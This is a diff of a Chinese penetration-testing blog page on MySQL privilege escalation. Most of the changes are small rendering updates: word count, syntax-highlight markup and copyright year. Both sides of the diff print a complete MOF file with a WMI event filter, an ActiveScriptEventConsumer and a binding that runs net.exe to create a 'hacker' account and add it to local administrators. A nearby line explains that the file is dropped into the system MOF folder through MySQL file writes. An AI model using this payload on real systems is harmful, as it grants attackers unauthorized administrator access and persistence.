@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/www.geekby.site\/2021\/01\/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86\/"
-        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试, 提权","wordcount":  863 ,
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试, 提权","wordcount":  1036 ,
         "url": "https:\/\/www.geekby.site\/2021\/01\/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86\/","datePublished": "2021-01-19T13:25:00+08:00","dateModified": "2021-01-19T13:25:00+08:00","publisher": {
             "@type": "Organization",
             "name": "Geekby","logo": {
@@ -109,7 +109,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">MySQL 提权方法整理</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a>&nbsp;<a href="/categories/%E5%B8%B8%E7%94%A8/"><i class="far fa-folder fa-fw"></i>常用</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-19">2021-01-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 863 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-19">2021-01-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1036 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -675,31 +675,31 @@
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#pragma namespace(&#34;\\\\.\\root\\subscription&#34;) 
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#pragma namespace(&#34;\\\\.\\root\\subscription&#34;) </span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">instance of __EventFilter as $EventFilter 
-</span></span><span class="line"><span class="cl">{ 
-</span></span><span class="line"><span class="cl">    EventNamespace = &#34;Root\\Cimv2&#34;; 
-</span></span><span class="line"><span class="cl">    Name  = &#34;filtP2&#34;; 
-</span></span><span class="line"><span class="cl">    Query = &#34;Select * From __InstanceModificationEvent &#34; 
-</span></span><span class="line"><span class="cl">            &#34;Where TargetInstance Isa \&#34;Win32_LocalTime\&#34; &#34; 
-</span></span><span class="line"><span class="cl">            &#34;And TargetInstance.Second = 5&#34;; 
-</span></span><span class="line"><span class="cl">    QueryLanguage = &#34;WQL&#34;; 
-</span></span><span class="line"><span class="cl">}; 
+</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="n">of</span> <span class="n">__EventFilter</span> <span class="n">as</span> <span class="o">$</span><span class="n">EventFilter</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">EventNamespace</span> <span class="o">=</span> <span class="s2">&#34;Root</span><span class="se">\\</span><span class="s2">Cimv2&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Name</span>  <span class="o">=</span> <span class="s2">&#34;filtP2&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Query</span> <span class="o">=</span> <span class="s2">&#34;Select * From __InstanceModificationEvent &#34;</span> 
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Where TargetInstance Isa </span><span class="se">\&#34;</span><span class="s2">Win32_LocalTime</span><span class="se">\&#34;</span><span class="s2"> &#34;</span> 
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;And TargetInstance.Second = 5&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">QueryLanguage</span> <span class="o">=</span> <span class="s2">&#34;WQL&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">};</span> 
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">instance of ActiveScriptEventConsumer as $Consumer 
-</span></span><span class="line"><span class="cl">{ 
-</span></span><span class="line"><span class="cl">    Name = &#34;consPCSV2&#34;; 
-</span></span><span class="line"><span class="cl">    ScriptingEngine = &#34;JScript&#34;; 
-</span></span><span class="line"><span class="cl">    ScriptText = 
-</span></span><span class="line"><span class="cl">&#34;var WSH = new ActiveXObject(\&#34;WScript.Shell\&#34;)\nWSH.run(\&#34;net.exe user hacker P@ssw0rd /add\&#34;)\nWSH.run(\&#34;net.exe localgroup administrators hacker /add\&#34;)&#34;; 
-</span></span><span class="line"><span class="cl">}; 
+</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="n">of</span> <span class="n">ActiveScriptEventConsumer</span> <span class="n">as</span> <span class="o">$</span><span class="n">Consumer</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Name</span> <span class="o">=</span> <span class="s2">&#34;consPCSV2&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">ScriptingEngine</span> <span class="o">=</span> <span class="s2">&#34;JScript&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">ScriptText</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;var WSH = new ActiveXObject(</span><span class="se">\&#34;</span><span class="s2">WScript.Shell</span><span class="se">\&#34;</span><span class="s2">)</span><span class="se">\n</span><span class="s2">WSH.run(</span><span class="se">\&#34;</span><span class="s2">net.exe user hacker P@ssw0rd /add</span><span class="se">\&#34;</span><span class="s2">)</span><span class="se">\n</span><span class="s2">WSH.run(</span><span class="se">\&#34;</span><span class="s2">net.exe localgroup administrators hacker /add</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">};</span> 
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">instance of __FilterToConsumerBinding 
-</span></span><span class="line"><span class="cl">{ 
-</span></span><span class="line"><span class="cl">    Consumer   = $Consumer; 
-</span></span><span class="line"><span class="cl">    Filter = $EventFilter; 
-</span></span><span class="line"><span class="cl">};
+</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="n">of</span> <span class="n">__FilterToConsumerBinding</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Consumer</span>   <span class="o">=</span> <span class="o">$</span><span class="n">Consumer</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">Filter</span> <span class="o">=</span> <span class="o">$</span><span class="n">EventFilter</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>利用 MySQL 写文件的特性将这个 MOF 文件导入到 <code>C:/Windows/system32/wbem/mof/</code> 目录下，依然采用上述编码的方式：</p>
@@ -930,7 +930,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
